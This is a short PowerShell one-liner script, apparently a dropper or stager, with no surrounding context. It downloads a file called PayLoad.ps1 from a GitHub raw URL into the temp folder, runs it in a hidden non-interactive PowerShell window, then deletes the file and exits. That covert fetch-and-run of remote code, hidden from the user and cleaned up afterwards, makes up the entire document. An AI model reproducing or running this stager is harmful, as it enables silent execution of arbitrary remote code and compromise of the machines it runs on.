$sp=$("$env:TEMP\p.ps1");iwr -Uri "https://raw.githubusercontent.com/Felix-ote/PenDev/main/PayLoad.ps1" -OutFile $sp;
saps -FilePath powershell.exe -ArgumentList "-WindowStyle hidden -File $sp -nop -NonInteractive"; sleep 1;rm -Force -Path $sp;exit
